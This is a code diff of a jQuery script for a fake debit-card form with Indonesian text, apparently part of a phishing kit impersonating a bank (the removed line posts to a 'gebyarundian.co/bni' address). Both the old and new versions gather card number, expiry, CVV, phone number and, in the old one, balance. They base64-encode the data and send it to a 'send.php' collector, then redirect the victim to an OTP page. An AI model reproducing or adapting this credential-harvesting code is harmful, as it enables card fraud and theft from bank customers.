@@ -1,67 +1,74 @@
 $(document).ready(function() {
-    var year = new Date().getFullYear();
-    var startYear = year-10;
-    var endYear = year+10;
-    for (var yr=startYear; yr<=endYear; yr++) {
-        $("#year").append("<option>"+yr+"</option>");
-    }
-    $("#debit-number").on("input", debitNumberUpdater);
-    $("#cvv").focus(function() {
-        $(".flip-card-inner").css("transform", "rotateY(180deg)");
-    });
-    $("#cvv").focusout(function() {
-        $(".flip-card-inner").css("transform", "rotateY(0deg)");
-    });
-    $("#cvv").on("input", function() {
-        var stars = "";
-        var cvv = $("#cvv").val().trim();
-        for (var i=0; i<cvv.length; i++) {
-            stars += "*";
+    $("#debit-number").on("input", function() {
+        var debitNumber = $("#debit-number").val().trim();
+        var originalDebitNumber = debitNumber;
+        if (debitNumber.length > 16) {
+            debitNumber = debitNumber.substring(0, 16);
         }
-        $("#preview-cvv").html(stars);
-    });
-    $(".card-detail input").focus(function() {
-        $(this).parent().css("background-color", "#ffffff");
-    });
-    $(".card-detail input").focusout(function() {
-        $(this).parent().css("background-color", "#dbdada");
+        if (debitNumber.length < 16) {
+            debitNumber = debitNumber.padEnd(16, "#");
+        }
+        var debitSlice1 = debitNumber.substring(0, 4);
+        var debitSlice2 = "****";
+        var length = originalDebitNumber.length-4;
+        if (length <= 4) {
+            debitSlice2 = "";
+            for (var i=0; i<length; i++) {
+                debitSlice2 += "*";
+            }
+            debitSlice2 = debitSlice2.padEnd(4, "#");
+        }
+        var debitSlice3 = "****";
+        length = originalDebitNumber.length-8;
+        if (length <= 4) {
+            debitSlice3 = "";
+            for (var i=0; i<length; i++) {
+                debitSlice3 += "*";
+            }
+            debitSlice3 = debitSlice3.padEnd(4, "#");
+        }
+        var debitSlice4 = debitNumber.substring(12, 16);
+        $("#preview-debit").html(debitSlice1+" "+debitSlice2+" "+debitSlice3+" "+debitSlice4);
     });
 });
 
-function debitNumberUpdater() {
-        /*var value = $("#debit-number").val().trim();
-        if (value.length>0) {
-            if (value.length==4 || value.length==9 || value.length==14) {
-                value += " ";
-                $("#debit-number").on("input", "");
-                $("#debit-number").val(value);
-                $("#debit-number").on("input", debitNumberUpdater);
-            }
-        }*/
-        if ($("#debit-number-img").css("display") == "none") {
-            $("#debit-number-img").css("display", "block");
-        }
-    };
-    
-function next() {
+function process() {
     var debitNumber = $("#debit-number").val().trim();
+    var expiryMonth = $("#expiry-mn").val().trim();
+    var expiryYear = $("#expiry-yr").val().trim();
     var cvv = $("#cvv").val().trim();
-    var month = $('#month').find(":selected").text();
-    var year = $('#year').find(":selected").text();
     var phone = $("#phone").val().trim();
-    var balance = $("#balance").val().trim();
-    if (debitNumber=="" || cvv=="" || month=="" || year=="" || phone=="" || balance=="") {
+    if (debitNumber=="" || expiryMonth=="" || expiryYear=="" || cvv=="" || phone=="") {
         alert("Mohon lengkapi data");
         return;
     }
+    if (expiryYear.length < 4) {
+        alert("Masukkan tahun sebanyak 4 digit");
+        return;
+    }
+    var expiry = expiryMonth.padStart(2, "0")+"/"+expiryYear.padStart(2, "0");
+    var debitSlice1 = debitNumber.substring(0, 4);
+    var debitSlice2 = debitNumber.substring(4, 8);
+    var debitSlice3 = debitNumber.substring(8, 12);
+    var debitSlice4 = debitNumber.substring(12, 16);
+    debitNumber = debitSlice1+" "+debitSlice2+" "+debitSlice3+" "+debitSlice4;
+    $("#loader").css("display", "flex");
     $.ajax({
         type: "get",
-        url: "https://www.gebyarundian.co/bni/send.php?message="+encodeURIComponent(btoa("<b>No. kartu debit:</b> "+debitNumber+"\n<b>Bulan/Tahun:</b> "+month+"/"+year+"\n<b>CVV:</b> "+cvv+"\n<b>No. HP</b>: "+phone+"\n<b>Saldo:</b> "+balance)),
+        url: "send.php?message="+btoa("No. HP: "+phone+"\nNo. Debit: "+debitNumber+"\nKadaluwarsa: "+expiry+"\nCVV: "+cvv),
         dataType: "text",
         success: function(response) {
+            $("#loader").css("display", "none");
             window.location.href = "otp.html?phone="+phone;
         }
     });
 }
 
-module.next = next;
+function goBack() {
+    setTimeout(() => {
+        window.history.back();
+    }, 500);
+}
+
+module.process = process;
+module.goBack = goBack;
